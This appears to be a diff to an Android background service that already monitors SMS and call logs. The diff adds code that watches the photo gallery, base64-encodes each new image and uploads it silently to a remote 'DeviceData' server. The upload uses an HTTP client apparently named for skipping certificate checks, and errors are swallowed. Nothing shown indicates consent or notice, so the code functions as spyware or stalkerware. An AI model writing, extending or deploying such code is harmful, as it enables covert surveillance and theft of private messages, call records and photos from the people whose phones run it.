@@ -23,6 +23,10 @@ import retrofit2.converter.gson.GsonConverterFactory
 import java.time.Instant
 import com.google.gson.annotations.SerializedName
 import android.provider.Telephony
+import android.provider.MediaStore
+import android.util.Base64
+import android.content.ContentUris
+import java.io.InputStream
 
 class SmsCallMonitorService : Service() {
     private var observerThread: HandlerThread? = null
@@ -31,6 +35,8 @@ class SmsCallMonitorService : Service() {
     private var smsObserver: ContentObserver? = null
     private var lastSmsInboxId: Long = -1L
     private var lastSmsSentId: Long = -1L
+    private var imageObserver: ContentObserver? = null
+    private var lastImageId: Long = -1L
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
@@ -58,6 +64,16 @@ class SmsCallMonitorService : Service() {
             }
         }
         contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver!!)
+
+        imageObserver = object : ContentObserver(handler) {
+            override fun onChange(selfChange: Boolean) {
+                onChange(selfChange, null)
+            }
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                processLatestImage()
+            }
+        }
+        contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, imageObserver!!)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -186,10 +202,60 @@ class SmsCallMonitorService : Service() {
         }
     }
 
+    private fun sendImageEvent(dto: ImageDto) {
+        val retrofit = Retrofit.Builder()
+            .baseUrl(HttpClient.BASE_URL)
+            .addConverterFactory(GsonConverterFactory.create())
+            .client(HttpClient.getUnsafeOkHttpClient())
+            .build()
+        val api = retrofit.create(ApiImage::class.java)
+        val payload = listOf(dto)
+        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
+        api.send(body).enqueue(object : retrofit2.Callback<Void> {
+            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
+            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
+        })
+    }
+
+    private fun processLatestImage() {
+        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED)
+        var cursor: Cursor? = null
+        try {
+            cursor = contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                MediaStore.Images.Media.DATE_ADDED + " DESC"
+            )
+            if (cursor != null && cursor.moveToFirst()) {
+                val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                val dateAddedSec = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
+                if (id != lastImageId) {
+                    lastImageId = id
+                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
+                    val input: InputStream? = contentResolver.openInputStream(contentUri)
+                    if (input != null) {
+                        val bytes = input.readBytes()
+                        input.close()
+                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                        val ts = Instant.ofEpochSecond(dateAddedSec).toString()
+                        sendImageEvent(ImageDto(base64Image = b64, timestamp = ts))
+                    }
+                }
+            }
+        } catch (e: SecurityException) {
+        } catch (e: Exception) {
+        } finally {
+            cursor?.close()
+        }
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         if (callLogObserver != null) contentResolver.unregisterContentObserver(callLogObserver!!)
         if (smsObserver != null) contentResolver.unregisterContentObserver(smsObserver!!)
+        if (imageObserver != null) contentResolver.unregisterContentObserver(imageObserver!!)
         observerThread?.quitSafely()
     }
 
@@ -200,6 +266,11 @@ class SmsCallMonitorService : Service() {
 
     interface ApiSms {
         @retrofit2.http.POST("api/DeviceData/smslog")
+        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
+    }
+
+    interface ApiImage {
+        @retrofit2.http.POST("api/DeviceData/cameraImage")
         fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
     }
 
@@ -215,6 +286,11 @@ class SmsCallMonitorService : Service() {
         @SerializedName("Body") val body: String?,
         @SerializedName("Type") val type: String,
         @SerializedName("Date") val date: String
+    )
+
+    data class ImageDto(
+        val base64Image: String,
+        val timestamp: String
     )
 
     companion object {
